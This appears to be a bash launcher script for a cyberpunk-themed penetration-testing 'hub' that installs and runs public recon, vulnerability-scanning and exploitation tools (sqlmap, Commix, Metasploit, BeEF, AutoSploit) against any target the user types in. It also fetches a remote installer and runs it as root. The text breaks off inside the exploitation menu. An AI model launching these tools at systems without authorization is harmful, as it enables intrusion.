#!/bin/bash

#COLOR PANEL
RESET="$(tput sgr0)"
BOLD="$(tput bold)"
RED="$(tput setaf 1)"
BLUE="$(tput setaf 6)"
GRAY="$(tput setaf 8)"
BRIGHT_RED="${BOLD}$(tput setaf 1)"
BRIGHT_BLUE="${BOLD}$(tput setaf 6)"

# Initial clear
clear

# ASCII Art
read -r -d '' ASCII_ART << 'EOF'
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠚⣡⠇⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢀⡴⠋⢠⣾⠶⠋⠀⠀⣾⡆⠀⠀⠀⣸⢻⡄⠀⠀
⠀⠀⢠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⣻⠀⠀⠀⠀⢠⣯⠁⣰⢿⣷⠀⠀⠀⣰⠋⣭⠀⣠⠞⢁⡼⠁⠀⠀
⠀⠀⢀⡯⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣹⣿⠃⠀⢠⢾⠟⣸⡏⣠⡿⠏⣾⢀⣀⣾⣇⣼⠃⠀⣿⡿⠋⠀⠀⠀⠀
⠀⠀⢸⠇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⢻⡛⢠⡄⣻⠛⣇⡿⠀⢼⡇⣴⠷⠋⡏⠿⣏⣀⣦⠀⠛⠁⠀⠀⠀⠀⣀
⠀⠀⠈⢳⣻⡀⠀⠀⠀⠀⢠⣦⡀⠀⠀⡿⣬⡇⣸⡙⠁⠐⠉⠀⢰⣿⡼⣯⡆⣰⢧⡞⣿⡽⣽⣦⠀⠀⠀⠀⢀⠼⣹             
⠀⠀⠀⠀⠙⠣⣦⡀⠀⠀⠈⠳⣽⡄⣶⣹⢺⣿⢧⠀⠀⠀⠀⣀⣸⣸⣹⢿⡿⣱⠟⠈⣿⣿⡿⢹⡀⣠⢿⠂⣟⡿⠁
⠀⠀⠀⣀⡀⢠⡿⣍⠳⣄⠀⠀⣠⣀⣽⣇⠘⣽⡈⢠⡇⠎⣝⠙⣋⣹⠦⡾⠋⠀⠀⣠⢯⡏⠀⣸⢰⣿⢸⡄⠙⠁⠀
⣿⣄⠀⠙⢿⣾⣽⣼⣇⠈⡇⠀⣟⣿⢸⡷⠆⢈⠀⢈⣠⣿⣿⣾⠿⣿⡇⢁⢀⡆⡆⣏⡾⣥⣶⣻⠀⣿⢸⡇⠀⠀⠀
⠘⢾⣳⡀⢻⡎⠉⣼⣿⣆⣇⣠⣻⡉⠘⣷⠸⣧⣷⣹⠋⢹⠟⠀⣼⠯⠀⣼⢟⠇⢃⣿⢻⣿⡟⢿⢠⡯⣼⠃⠀⠀⠀
⠀⠀⠻⠃⣬⣗⠶⡿⠹⡟⣷⠀⠹⣇⡀⢪⢃⢽⠇⠁⠈⣠⣶⣼⣷⠋⠘⠿⠂⣤⣗⣿⠘⣧⡃⢨⠿⠞⠁⠀⠀⠀⠀
⠀⠀⠀⠀⢸⢿⣾⣔⡋⢙⡲⣶⣾⣟⣧⣾⡌⠻⢇⢠⢰⣷⠀⣿⡆⠀⠄⣴⣿⣿⣷⢻⣰⣯⣷⣯⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢶⣦⣏⠿⢿⡳⢭⣿⣶⣿⣯⣿⣿⢁⣴⡃⣼⢸⣞⢧⡀⠁⠅⣰⣾⣿⣿⣿⣿⠟⣿⣼⣷⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⣿⠇⠠⣼⣯⡶⣿⣻⣿⣿⢻⢺⣿⡳⠞⠃⠀⠙⠷⣿⣤⣴⣿⣿⣿⣿⣿⠇⣼⣼⣿⢹⠇⠀⠀⠀⠀⠀⠀⠀
⠀⣀⡀⠻⣄⢴⣷⢍⣙⣻⠮⠽⠿⠿⢍⡻⣷⣶⣅⡀⢶⣎⠻⣿⡿⣿⣿⣿⣟⣡⡿⣫⡇⣿⣟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠙⢿⣇⣉⠻⡷⣷⠮⣝⣳⣔⡶⢖⢞⡱⣿⣟⣿⠃⢔⠙⢷⣮⡙⢷⣦⣆⣑⣤⣶⣯⣾⢟⢮⡳⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣽⠀⠘⠿⠀⠀⠀⢠⠶⠞⣈⡇⠀⣿⣡⡄⢬⣶⢶⢙⡷⣄⣉⠉⠛⢙⠟⢟⣅⠑⣕⡽⣎⢦⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⠀⠀⣠⠀⠀⠰⣡⡦⣄⣏⣃⡘⣿⣏⡄⣺⢷⣫⡾⣏⣽⣽⡻⣆⣸⠣⡀⢙⣿⣥⣙⠜⣸⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠛⠀⠀⣠⠟⠀⢘⣏⣹⣟⣟⢾⡝⠏⢝⣩⠿⡏⠀⠈⢷⣻⣏⠀⠈⠛⠦⣉⣉⣠⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣀⠤⠒⠋⠀⠀⣠⢾⠧⣀⡀⢀⣀⣉⣉⠉⠁⢰⢿⠢⡀⠀⠙⠿⢄⣀⡀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠛⠒⠒⠒⠒⠺⣏⢳⣸⣤⣽⠟⣉⣁⣨⣛⡙⠿⣯⣸⣧⠟⠳⣤⢤⢀⣈⣩⠽⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⣄⣠⠾⣿⠛⢟⠞⠙⠻⣗⡮⣬⣔⣲⡶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢾⡁⠀⠀⢨⠀⢀⢘⣯⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⠒⠻⠳⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


EOF

info_list=(
    "HOST : Relic"
    ""
    "*━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━......."
    ""
    "OS: Militech APOGEE SANDEVISTAN"
    "Architecture: cw_system_sandevistanedgerunner x64"
    "Creator: ${BRIGHT_BLUE}\e]8;;https://github.com/WhiteMuush\aMelvin PETIT\e]8;;\a${RESET}"
    ""
    "*━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━......."
    ""
    "${BRIGHT_RED}Information System${RESET}:"
    ""
    "Welcome cyberpsycho,"
    "${BRIGHT_RED}SANDEVISTAN${RESET} ${BRIGHT_BLUE}is your ultimate hub a single space where every reconnaissance, exploitation,"
    "and post-exploitation tool converges. No more jumping between countless platforms,"
    "everything you need is right here, optimized and ready to deploy."
    "Unleash your potential, accelerate your actions, and dive deeper into systems with surgical precision."
)


display_ascii_info() {
    # Convert to arrays
    local -a info_lines ascii_lines
    info_lines=("${info_list[@]}")
    local IFS=$'\n'
    read -d '' -r -a ascii_lines <<< "$ASCII_ART"

    # Lengths
    local ascii_count=${#ascii_lines[@]}
    local info_count=${#info_lines[@]}

    # Center info vertically vs ASCII
    local vertical_offset=$(((ascii_count - info_count) / 2))

    # Max ASCII width (for padding)
    local max_width=0
    local line
    for line in "${ascii_lines[@]}"; do
        ((${#line} > max_width)) && max_width=${#line}
    done

    local spacing="  "

    # Render
    local i ascii_line colored_ascii colored_info info_idx info_line pad label value
    for ((i=0; i<ascii_count; i++)); do
        ascii_line="${ascii_lines[i]:-}"
        colored_ascii="${BRIGHT_RED}${ascii_line}${RESET}"

        colored_info=""
        if ((i >= vertical_offset && i < vertical_offset + info_count)); then
            info_idx=$((i - vertical_offset))
            info_line="${info_lines[$info_idx]:-}"

            # Colorize: label in bright red and value in bright blue
            if [[ "$info_line" == *:* ]]; then
                label="${info_line%%:*}"
                value="${info_line#*:}"
                value="${value# }"
                colored_info="${BRIGHT_RED}${label}${RESET}: ${BRIGHT_BLUE}${value}${RESET}"
            else
                colored_info="${BRIGHT_BLUE}${info_line}${RESET}"
            fi
        fi

        pad=$((max_width - ${#ascii_line}))
        ((pad < 0)) && pad=0

        printf "%b%b\n" \
            "   $colored_ascii" \
            "$(printf '%*s' "$pad" '')${spacing}${colored_info}"
    done
}

declare -a MENU_ITEMS=(
    "NETWORK RECONNAISSANCE"
    "VULNERABILITY SCANNING"
    "EXPLOITATION FRAMEWORK"
    "POST-EXPLOITATION"
    "CREDENTIAL HARVESTING"
    "PAYLOAD GENERATOR"
    "LEAVE"
)

display_menu() {

    echo -e "${BRIGHT_RED}"
    echo ""
    echo ""
    echo "      ╔═══════════════════════════════════════════╗"
    echo "      ║${RESET}     ${BRIGHT_BLUE}▓▒░    SANDEVISTAN Toolkit    ░▒▓${BRIGHT_RED}     ║"
    echo "      ╚═══════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "      System: ${BRIGHT_BLUE}OPERATIONAL${RESET}  ${BRIGHT_RED}✞${RESET}  Security Level: ${BRIGHT_RED}MAXIMUM${RESET}"
    echo ""
    
    echo -e "        ${BRIGHT_BLUE}┌─                                      ─┐${RESET}"
    echo ""
    
    for i in "${!MENU_ITEMS[@]}"; do  
        item="${MENU_ITEMS[$i]}"
        num=$((i + 1))
        
        printf "            ${RED}[%d]${RESET} %s\n" "$num" "  ${BRIGHT_BLUE}$item"
    done
    echo ""
    echo -e "        ${BRIGHT_BLUE}└──                                    ──┘${RESET}"
    echo ""
}


check_and_install_tool() {
    local tool_name=$1
    local install_command=$2
    
    if ! command -v "$tool_name" &> /dev/null; then
        echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}$tool_name is not installed.${RESET}"
        read -rp "Would you like to install it? (yes/no): " install_choice
        
        case $install_choice in
            yes|y|Y|YES)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing $tool_name...\n"
                eval "$install_command"
                
                if command -v "$tool_name" &> /dev/null; then
                    echo -e "\n${BRIGHT_GREEN}[✓]${RESET} $tool_name installed successfully!\n"
                    return 0
                else
                    echo -e "\n${BRIGHT_RED}[✗]${RESET} Installation failed. Please install manually.\n"
                    return 1
                fi
                ;;
            *)
                echo -e "\n${BRIGHT_RED}[!]${RESET} Installation cancelled.\n"
                return 1
                ;;
        esac
    fi
    return 0
}


# Choice 1: Network Reconnaissance
network_reconnaissance_menu(){
    clear
    display_ascii_info
    echo -e "${BRIGHT_RED}"
    echo ""
    echo ""
    echo "      ╔═════════════════════════════════════════════════╗"
    echo "      ║${RESET}     ${BRIGHT_BLUE}▓▒░    NETWORK RECONNAISSANCE MODULE    ░▒▓${BRIGHT_RED}     ║"
    echo "      ╚═════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "      System: ${BRIGHT_BLUE}OPERATIONAL${RESET}  ${BRIGHT_RED}✞${RESET}  Security Level: ${BRIGHT_RED}MAXIMUM${RESET}"
    echo ""
    
    echo -e "        ${BRIGHT_BLUE}┌─                                      ─┐${RESET}"
    echo ""


    local options=(
        "1) Nmap"
        "2) Masscan"
        "3) Recon-ng"
        "4) Amass"
        "5) Sublister"
        "7) TheHarvester"
        "8) Dirbuster"
        "9) dnsenum"
        "10) WhatWeb"
        "99) Back to Main Menu"
    )
    
    for option in "${options[@]}"; do
        echo -e "            ${RED}[${option%%)*}]${RESET} ${BRIGHT_BLUE}${option#*)}${RESET}"
    done
    
    echo ""
    echo -e "        ${BRIGHT_BLUE}└──                                    ──┘${RESET}"
    echo ""
    
    while true; do
        read -rp " ${BRIGHT_BLUE}user@nexus:~${RESET}${BRIGHT_RED}\$${RESET} " sub_choice
        
        case $sub_choice in
            1)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Nmap...\n"
                if check_and_install_tool "nmap" "sudo apt-get install -y nmap"; then
                    read -rp "Enter target (IP/hostname): " target
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Executing Nmap scan...\n"
                    nmap "$target"
                fi
                ;;
            2)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Masscan...\n"
                if check_and_install_tool "masscan" "sudo apt-get install -y masscan"; then
                    read -rp "Enter target (IP/range): " target
                    read -rp "Enter ports (e.g., 1-1000): " ports
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Performing Masscan...\n"
                    sudo masscan "$target" -p"$ports" --rate=1000
                fi
                ;;
            3)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Recon-ng...\n"
                if check_and_install_tool "recon-ng" "sudo apt-get install -y recon-ng"; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Starting Recon-ng...\n"
                    recon-ng
                fi
                ;;
            4)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Amass...\n"
                if check_and_install_tool "amass" "sudo apt-get install -y amass"; then
                    read -rp "Enter domain: " domain
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running Amass enumeration...\n"
                    amass enum -d "$domain"
                fi
                ;;
            5)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Sublist3r...\n"
                if check_and_install_tool "sublist3r" "sudo apt-get install -y sublist3r"; then
                    read -rp "Enter domain: " domain
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running Sublist3r...\n"
                    sublist3r -d "$domain"
                fi
                ;;
            7)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking TheHarvester...\n"
                if check_and_install_tool "theHarvester" "sudo apt-get install -y theharvester"; then
                    read -rp "Enter domain: " domain
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running TheHarvester...\n"
                    theHarvester -d "$domain" -b all
                fi
                ;;
            8)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Dirbuster...\n"
                if check_and_install_tool "dirb" "sudo apt-get install -y dirb"; then
                    read -rp "Enter URL: " url
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running Dirb...\n"
                    dirb "$url"
                fi
                ;;
            9)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking dnsenum...\n"
                if check_and_install_tool "dnsenum" "sudo apt-get install -y dnsenum"; then
                    read -rp "Enter domain: " domain
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running dnsenum...\n"
                    dnsenum "$domain"
                fi
                ;;
            10)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking WhatWeb...\n"
                if check_and_install_tool "whatweb" "sudo apt-get install -y whatweb"; then
                    read -rp "Enter URL: " url
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running WhatWeb...\n"
                    whatweb "$url"
                fi
                ;;
            99)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Returning to Main Menu...\n"
                sleep 1
                clear
                return
                ;;
            *)
                echo -e "\n${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Invalid selection${RESET}\n"
                sleep 1
                clear
                ;;
        esac
        
        echo ""
        read -rp "${BRIGHT_BLUE}Press Enter to continue..."
        clear
        return
    done
}


#CHOICE 2: Vulnerability Scanning
vulnerability_menu(){
    clear
    display_ascii_info
    echo -e "${BRIGHT_RED}"
    echo ""
    echo ""
    echo "      ╔══════════════════════════════════════════════╗"
    echo "      ║${RESET}     ${BRIGHT_BLUE}▓▒░    VULNERABILITY SCANNING    ░▒▓${BRIGHT_RED}     ║"
    echo "      ╚══════════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "       System: ${BRIGHT_BLUE}OPERATIONAL${RESET}  ${BRIGHT_RED}✞${RESET}  Security Level: ${BRIGHT_RED}MAXIMUM${RESET}"
    echo ""
    echo -e "        ${BRIGHT_BLUE}┌─                                      ─┐${RESET}"
    echo ""

    local options=(
        "1) Nikto"
        "2) Nuclei"
        "3) Wapiti"
        "4) SQLMap"
        "5) XSStrike"
        "6) Commix"
        "7) WPScan"
        "99) Back to Main Menu"
    )
    
    for option in "${options[@]}"; do
        echo -e "            ${RED}[${option%%)*}]${RESET} ${BRIGHT_BLUE}${option#*)}${RESET}"
    done
    
    echo ""
    echo -e "        ${BRIGHT_BLUE}└──                                    ──┘${RESET}"
    echo ""
    
    while true; do
        read -rp " ${BRIGHT_BLUE}user@nexus:~${RESET}${BRIGHT_RED}\$${RESET} " sub_choice
        
        case $sub_choice in
            1)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Nikto...\n"
                if check_and_install_tool "nikto" "sudo apt-get install -y nikto"; then
                    read -rp "Enter target URL: " target
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running Nikto web scanner...\n"
                    nikto -h "$target"
                fi
                ;;
            2)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Nuclei...\n"
                if ! command -v nuclei &> /dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Nuclei is not installed.${RESET}"
                    read -rp "Would you like to install it? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Nuclei from GitHub...\n"
                        if command -v go &> /dev/null; then
                            go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
                            export PATH=$PATH:~/go/bin
                        else
                            echo -e "${BRIGHT_RED}[!]${RESET} Go is not installed. Installing via apt...\n"
                            sudo apt-get install -y golang-go
                            go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
                            export PATH=$PATH:~/go/bin
                        fi
                    fi
                fi
                if command -v nuclei &> /dev/null || [ -f ~/go/bin/nuclei ]; then
                    read -rp "Enter target URL: " target
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running Nuclei vulnerability scanner...\n"
                    ~/go/bin/nuclei -u "$target" -severity critical,high,medium
                fi
                ;;
            3)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Wapiti...\n"
                if check_and_install_tool "wapiti" "sudo apt-get install -y wapiti"; then
                    read -rp "Enter target URL: " target
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running Wapiti web application scanner...\n"
                    wapiti -u "$target"
                fi
                ;;
            4)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking SQLMap...\n"
                if check_and_install_tool "sqlmap" "sudo apt-get install -y sqlmap"; then
                    read -rp "Enter target URL: " target
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running SQLMap for SQL injection testing...\n"
                    sqlmap -u "$target" --batch --random-agent
                fi
                ;;
            5)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking XSStrike...\n"
                if [ ! -d ~/tools/XSStrike ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}XSStrike is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning XSStrike from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/s0md3v/XSStrike.git ~/tools/XSStrike
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing dependencies...\n"
                        pip3 install -r ~/tools/XSStrike/requirements.txt
                    fi
                fi
                if [ -d ~/tools/XSStrike ]; then
                    read -rp "Enter target URL: " target
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running XSStrike for XSS detection...\n"
                    python3 ~/tools/XSStrike/xsstrike.py -u "$target"
                fi
                ;;
            6)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Commix...\n"
                if [ ! -d ~/tools/commix ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Commix is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning Commix from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/commixproject/commix.git ~/tools/commix
                        chmod +x ~/tools/commix/commix.py
                    fi
                fi
                if [ -d ~/tools/commix ]; then
                    read -rp "Enter target URL: " target
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running Commix for command injection...\n"
                    python3 ~/tools/commix/commix.py --url="$target" --batch
                fi
                ;;
            7)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking WPScan...\n"
                if ! command -v wpscan &> /dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}WPScan is not installed.${RESET}"
                    read -rp "Would you like to install it? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing WPScan...\n"
                        sudo gem install wpscan
                    fi
                fi
                if command -v wpscan &> /dev/null; then
                    read -rp "Enter WordPress URL: " target
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Running WPScan for WordPress vulnerabilities...\n"
                    wpscan --url "$target" --enumerate vp,vt,u
                fi
                ;;
            99)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Returning to Main Menu...\n"
                sleep 1
                clear
                return
                ;;
            *)
                echo -e "\n${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Invalid selection${RESET}\n"
                sleep 1
                clear
                ;;
        esac
        
        echo ""
        read -rp "${BRIGHT_BLUE}Press Enter to continue...${RESET}"
        clear
        return
    done
}

# CHOICE 3: Exploitation Framework
exploitation_menu(){
    clear
    display_ascii_info
    echo -e "${BRIGHT_RED}"
    echo ""
    echo ""
    echo "      ╔═══════════════════════════════════════════════╗"
    echo "      ║${RESET}     ${BRIGHT_BLUE}▓▒░    EXPLOITATION FRAMEWORK    ░▒▓${BRIGHT_RED}      ║"
    echo "      ╚═══════════════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "       System: ${BRIGHT_BLUE}OPERATIONAL${RESET}  ${BRIGHT_RED}✞${RESET}  Security Level: ${BRIGHT_RED}MAXIMUM${RESET}"
    echo ""
    echo -e "        ${BRIGHT_BLUE}┌─                                      ─┐${RESET}"
    echo ""

    local options=(
        "1) Metasploit Framework"
        "2) SearchSploit"
        "3) RouterSploit"
        "4) BeEF"
        "5) AutoSploit"
        "6) SPARTA"
        "7) Sn1per"
        "99) Back to Main Menu"
    )
    
    for option in "${options[@]}"; do
        echo -e "            ${RED}[${option%%)*}]${RESET} ${BRIGHT_BLUE}${option#*)}${RESET}"
    done
    
    echo ""
    echo -e "        ${BRIGHT_BLUE}└──                                    ──┘${RESET}"
    echo ""
    
    while true; do
        read -rp " ${BRIGHT_BLUE}user@nexus:~${RESET}${BRIGHT_RED}\$${RESET} " sub_choice
        
        case $sub_choice in
            1)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Metasploit Framework...\n"
                if ! command -v msfconsole &> /dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Metasploit is not installed.${RESET}"
                    read -rp "Would you like to install it? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Metasploit Framework...\n"
                        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
                        chmod 755 msfinstall
                        sudo ./msfinstall
                        rm msfinstall
                    fi
                fi
                if command -v msfconsole &> /dev/null; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Launching Metasploit Console...\n"
                    msfconsole
                fi
                ;;
            2)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking SearchSploit...\n"
                if ! command -v searchsploit &> /dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}SearchSploit is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning ExploitDB from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/offensive-security/exploitdb.git ~/tools/exploitdb
                        sudo ln -sf ~/tools/exploitdb/searchsploit /usr/local/bin/searchsploit
                    fi
                fi
                if command -v searchsploit &> /dev/null; then
                    read -rp "Enter search keyword: " keyword
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Searching ExploitDB for: $keyword\n"
                    searchsploit "$keyword"
                fi
                ;;
            3)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking RouterSploit...\n"
                if [ ! -d ~/tools/routersploit ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}RouterSploit is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning RouterSploit from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/threat9/routersploit ~/tools/routersploit
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing dependencies...\n"
                        cd ~/tools/routersploit
                        pip3 install -r requirements.txt
                        cd -
                    fi
                fi
                if [ -d ~/tools/routersploit ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Launching RouterSploit Framework...\n"
                    cd ~/tools/routersploit
                    python3 rsf.py
                    cd -
                fi
                ;;
            4)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking BeEF (Browser Exploitation Framework)...\n"
                if [ ! -d ~/tools/beef ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}BeEF is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning BeEF from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/beefproject/beef ~/tools/beef
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing dependencies...\n"
                        cd ~/tools/beef
                        sudo apt-get install -y ruby ruby-dev libsqlite3-dev
                        sudo gem install bundler
                        bundle install
                        cd -
                    fi
                fi
                if [ -d ~/tools/beef ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Starting BeEF Server...\n"
                    echo -e "${BRIGHT_BLUE}Default credentials: beef:beef${RESET}"
                    echo -e "${BRIGHT_BLUE}Access at: http://127.0.0.1:3000/ui/panel${RESET}\n"
                    cd ~/tools/beef
                    ./beef
                    cd -
                fi
                ;;
            5)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking AutoSploit...\n"
                if [ ! -d ~/tools/AutoSploit ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}AutoSploit is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning AutoSploit from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/NullArray/AutoSploit.git ~/tools/AutoSploit
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing dependencies...\n"
                        cd ~/tools/AutoSploit
                        pip3 install -r requirements.txt
                        cd -
                    fi
                fi
                if [ -d ~/tools/AutoSploit ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Launching AutoSploit...\n"
                    echo -e "${BRIGHT_BLUE}Note: Requires Metasploit installed${RESET}\n"
                    cd ~/tools/AutoSploit
                    python3 autosploit.py
                    cd -
                fi
                ;;
            6)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking SPARTA...\n"
                if [ ! -d ~/tools/sparta ]; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}SPARTA is not installed.${RESET}"
                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
                    if [[ $install_choice =~ ^[Yy]([Ee][Ses])?$ ]]; then
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning SPARTA from GitHub...\n"
                        mkdir -p ~/tools
                        git clone https://github.com/SECFORCE/sparta.git ~/tools/sparta
                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing dependencies...\n"
                        sudo apt-get install -y python3-pyqt5 python3-sqlalchemy python3-pyqt5.qtwebkit ldap-utils rwho rsh-client x11-apps finger
                    fi
                fi
                if [ -d ~/tools/sparta ]; then
                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Launching SPARTA GUI...\n"
                    cd ~/tools/sparta
                    sudo python3 sparta.py
                    cd -
                fi
                ;;
            7)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Sn1per...\n"
                if ! command -v sniper &> /dev/null; then
                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Sn1per is not installed.${RESET}"
